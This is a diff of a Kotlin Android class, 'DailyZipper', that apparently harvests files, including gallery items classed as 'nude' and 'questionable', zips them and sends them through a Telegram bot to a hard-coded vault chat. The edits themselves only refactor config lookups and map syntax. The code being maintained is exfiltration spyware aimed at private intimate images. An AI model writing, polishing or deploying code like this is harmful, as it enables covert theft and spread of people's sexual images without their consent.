@@ -25,7 +25,7 @@ import java.util.zip.ZipOutputStream
 
 /**
  * فئة تجميع الملفات وحصادها بضغطها في ملفات ZIP وإرسالها بطريقة آمنة وفعالة.
- * ✅ تم استخراج جميع قيم التكوين في متغيرات محلية لتجنب أي تعارض مع MatchGroupCollection.
+ * ✅ تم تجنب استخدام [] أو .get() على الخرائط مباشرة، واستخدام دوال مساعدة صريحة.
  */
 class DailyZipper(
     context: Context,
@@ -80,7 +80,7 @@ class DailyZipper(
         getDeviceTag()
     }
 
-    // ========== الإعدادات (خريطة داخلية، ولكننا نستخرج القيم مسبقاً) ==========
+    // ========== الإعدادات (تعريف صريح) ==========
     private val config = HashMap<String, Any>()
 
     companion object {
@@ -93,7 +93,6 @@ class DailyZipper(
     }
 
     init {
-        // تعيين القيم الافتراضية
         config.put("max_batch_size", 48L * 1024L * 1024L)
         config.put("storage_extra", 100L * 1024L * 1024L)
         config.put("send_retry_delays", listOf(2000L, 4000L, 8000L))
@@ -105,16 +104,14 @@ class DailyZipper(
         loadConfig()
     }
 
-    // ============================================================
-    //  دوال استخراج القيم (تُستخدم فقط في بداية الدوال)
-    // ============================================================
+    // ========== دوال مساعدة للوصول الآمن ==========
 
+    // دالة استخراج آمنة (لا تستخدم [] ولا .get() مباشرة بل تستخدم getOrElse)
     @Suppress("UNCHECKED_CAST")
-    private fun <T> getConfig(key: String, defaultValue: T): T {
-        val value = config.get(key)
-        if (value == null) return defaultValue
+    private fun <T> getConfigValue(key: String, default: T): T {
+        val value = config.getOrElse(key) { return default }
         return try {
-            when (defaultValue) {
+            when (default) {
                 is Long -> (value as Number).toLong() as T
                 is Int -> (value as Number).toInt() as T
                 is Boolean -> value as T
@@ -123,19 +120,19 @@ class DailyZipper(
                 else -> value as T
             }
         } catch (e: Exception) {
-            defaultValue
+            default
         }
     }
 
-    // استخراج جميع قيم التكوين المستخدمة مسبقاً
-    private fun extractConfigValues(): ConfigValues {
+    // استخراج جميع القيم في كائن واحد
+    private fun getConfig(): ConfigValues {
         return ConfigValues(
-            maxBatchSize = getConfig("max_batch_size", 48L * 1024L * 1024L),
-            storageExtra = getConfig("storage_extra", 100L * 1024L * 1024L),
-            sendRetryDelays = getConfig("send_retry_delays", listOf(2000L, 4000L, 8000L)),
-            maxProcessedHashes = getConfig("max_processed_hashes", 10000),
-            defaultVaultId = getConfig("default_vault_id", -1003577715762L),
-            maxBatches = getConfig("max_batches", 10)
+            maxBatchSize = getConfigValue("max_batch_size", 48L * 1024L * 1024L),
+            storageExtra = getConfigValue("storage_extra", 100L * 1024L * 1024L),
+            sendRetryDelays = getConfigValue("send_retry_delays", listOf(2000L, 4000L, 8000L)),
+            maxProcessedHashes = getConfigValue("max_processed_hashes", 10000),
+            defaultVaultId = getConfigValue("default_vault_id", -1003577715762L),
+            maxBatches = getConfigValue("max_batches", 10)
         )
     }
 
@@ -163,7 +160,7 @@ class DailyZipper(
             json.keys().forEach { key ->
                 config.put(key, json.get(key))
             }
-            maxBatchSize = getConfig("max_batch_size", 48L * 1024L * 1024L)
+            maxBatchSize = getConfigValue("max_batch_size", 48L * 1024L * 1024L)
         } catch (e: Exception) {
             writeLog("Config load error: ${e.message}")
         }
@@ -206,8 +203,9 @@ class DailyZipper(
         }
     }
 
+    // ✅ استخدام getConfig() بدلاً من الوصول المباشر
     private fun checkStorage(requiredBytes: Long): Boolean {
-        val cfg = extractConfigValues()
+        val cfg = getConfig()
         return try {
             val stat = StatFs(runtimeDir.absolutePath)
             val available = stat.availableBlocksLong * stat.blockSizeLong
@@ -273,7 +271,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات مع إعادة المحاولة (استخدام متغيرات محلية)
+    //  إرسال الملفات مع إعادة المحاولة
     // ============================================================
 
     private suspend fun safeSend(
@@ -283,7 +281,7 @@ class DailyZipper(
     ): Boolean {
         if (telegram == null) return false
 
-        val cfg = extractConfigValues()
+        val cfg = getConfig()
         var target = targetChat
         if (target == null) {
             target = invokeMethod(telegram, "getVlt") as? Long
@@ -306,7 +304,8 @@ class DailyZipper(
         for ((attempt, delayMs) in delays.withIndex()) {
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
-                val isOk = (result as? Map<*, *>)?.get("ok") as? Boolean ?: false
+                val resultMap = result as? Map<String, Any>
+                val isOk = resultMap?.get("ok") as? Boolean ?: false
                 if (isOk) {
                     return true
                 }
@@ -322,7 +321,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إجبار الإرسال الفوري (استخدام متغيرات محلية)
+    //  إجبار الإرسال الفوري
     // ============================================================
 
     fun forceSendNow(chatId: Long? = null): Boolean {
@@ -374,7 +373,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  الضغط والتغليف والتحزيم (استخدام متغيرات محلية)
+    //  الضغط والتغليف والتحزيم
     // ============================================================
 
     private suspend fun packAndShip(
@@ -384,8 +383,7 @@ class DailyZipper(
     ): Boolean {
         if (files.isEmpty()) return false
 
-        // استخراج جميع قيم التكوين في بداية الدالة
-        val cfg = extractConfigValues()
+        val cfg = getConfig()
         val maxHashes = cfg.maxProcessedHashes
         val maxBatches = cfg.maxBatches
 
@@ -419,7 +417,6 @@ class DailyZipper(
                 return false
             }
 
-            // ✅ استخدام المتغير المحلي maxHashes بدلاً من الوصول للخريطة
             if (processedHashes.size > maxHashes) {
                 processedHashes.clear()
             }
@@ -432,7 +429,6 @@ class DailyZipper(
                 return false
             }
 
-            // تقسيم الملفات إلى دفعات
             val batches = mutableListOf<MutableList<File>>()
             var curBatch = mutableListOf<File>()
             var curSize = 0L
@@ -465,7 +461,6 @@ class DailyZipper(
                 batches.add(curBatch)
             }
 
-            // ✅ استخدام المتغير المحلي maxBatches
             val limitedBatches = if (batches.size > maxBatches) {
                 writeLog("Too many batches (${batches.size}), limiting to $maxBatches")
                 batches.take(maxBatches)
@@ -623,7 +618,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  التشغيل التلقائي (استخدام متغيرات محلية)
+    //  التشغيل التلقائي
     // ============================================================
 
     fun run(): Boolean {
@@ -644,13 +639,15 @@ class DailyZipper(
                     listOf("nude", "questionable").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // ✅ استخدام as? Map<*, *> ثم get("path") بدلاً من []
+                            // ✅ التحويل الصريح إلى Map ثم استخراج القيمة
                             val mapItem = item as? Map<*, *>
-                            val path = mapItem?.get("path") as? String
-                            if (!path.isNullOrEmpty()) {
-                                val f = File(path)
-                                if (f.exists()) {
-                                    allFiles.add(f)
+                            if (mapItem != null) {
+                                val path = mapItem.get("path") as? String
+                                if (!path.isNullOrEmpty()) {
+                                    val f = File(path)
+                                    if (f.exists()) {
+                                        allFiles.add(f)
+                                    }
                                 }
                             }
                         }
@@ -713,8 +710,8 @@ class DailyZipper(
         }
 
         val result = HashMap<String, Any>()
-        result.put("pending", count)
-        result.put("size", totalSize)
+        result["pending"] = count
+        result["size"] = totalSize
         return result
     }
 
@@ -725,8 +722,8 @@ class DailyZipper(
     private fun sendMessage(chatId: Long, text: String) {
         if (telegram == null) return
         val params = HashMap<String, Any>()
-        params.put("chat_id", chatId)
-        params.put("text", text)
+        params["chat_id"] = chatId
+        params["text"] = text
         invokeMethod(telegram, "api", "sendMessage", params)
     }
 
